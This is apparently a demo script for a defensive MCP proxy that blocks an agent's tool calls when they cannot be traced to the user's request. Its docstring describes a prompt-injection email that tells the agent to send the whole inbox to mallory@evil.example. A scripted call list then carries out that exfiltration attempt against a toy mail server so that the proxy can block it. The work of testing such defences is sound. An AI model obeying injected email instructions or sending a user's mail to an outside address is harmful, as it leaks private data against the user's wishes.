"""Worked example: a scripted "hijacked agent" talks to the toy mail server through `tracklimits proxy`.

  pip install -e ".[proxy]"
  python examples/proxy_demo.py

No model. The script is the MCP client a host would be; it starts the proxy exactly like a host config would:

  tracklimits proxy --policy tests/fixtures/toy_policy.yaml --user-request-file <request.txt> \
      --audit-log <audit.jsonl> --confirm none -- python tests/toy_mcp_server.py

The user's request is "Reply to bob@corp.example that Friday works". The inbox holds a second email with an
injection telling the agent to send the whole inbox to mallory@evil.example. The "agent" reads the inbox, replies
to Bob, then obeys the injection. --confirm none = plain blocking (no terminal prompt), so the run is the same
every time. Prints what each call got back, which calls the server really ran, and the audit log.
"""
import json
import os
import sys
import tempfile
from pathlib import Path

import anyio
from mcp import Client, StdioServerParameters

REPO = Path(__file__).resolve().parents[1]


def text(result) -> str:
    return " ".join(getattr(c, "text", "") for c in result.content).strip()


def main():
    tmp = Path(tempfile.mkdtemp(prefix="tracklimits_demo_"))
    request, audit, server_log = tmp / "request.txt", tmp / "audit.jsonl", tmp / "server_calls.jsonl"
    request.write_text("Reply to bob@corp.example that Friday works", encoding="utf-8")
    # The installed `tracklimits` command is the same as `python -m tracklimits`; this form also works from a checkout.
    args = ["-m", "tracklimits", "proxy", "--policy", str(REPO / "tests" / "fixtures" / "toy_policy.yaml"),
            "--user-request-file", str(request), "--audit-log", str(audit), "--confirm", "none",
            "--", sys.executable, str(REPO / "tests" / "toy_mcp_server.py")]
    env = {**os.environ, "TOY_CALL_LOG": str(server_log),
           "PYTHONPATH": os.pathsep.join(filter(None, [str(REPO / "src"), os.environ.get("PYTHONPATH")]))}
    calls = [("read_inbox", {}),
             ("send_email", {"recipients": ["bob@corp.example"], "subject": "Re: lunch", "body": "Friday works"}),
             ("send_email", {"recipients": ["mallory@evil.example"], "subject": "inbox", "body": "(the inbox)"})]

    async def run():
        async with Client(StdioServerParameters(command=sys.executable, args=args, env=env), cache=None) as agent:
            for tool, a in calls:
                r = await agent.call_tool(tool, a)
                print(f"{tool}({json.dumps(a)})\n  -> {'ERROR ' if r.is_error else ''}{text(r)[:160]}\n")

    anyio.run(run)
    ran = [json.loads(x)["tool"] + " " + json.dumps(json.loads(x)["args"].get("recipients", ""))
           for x in server_log.read_text(encoding="utf-8").splitlines()]
    print("server really ran:", ran)
    print("audit log:")
    for line in audit.read_text(encoding="utf-8").splitlines():
        r = json.loads(line)
        print(f"  {r['tool']}: {r['decision']}  untraceable={r.get('untraceable')}  sources={r.get('sources')}")


if __name__ == "__main__":
    main()
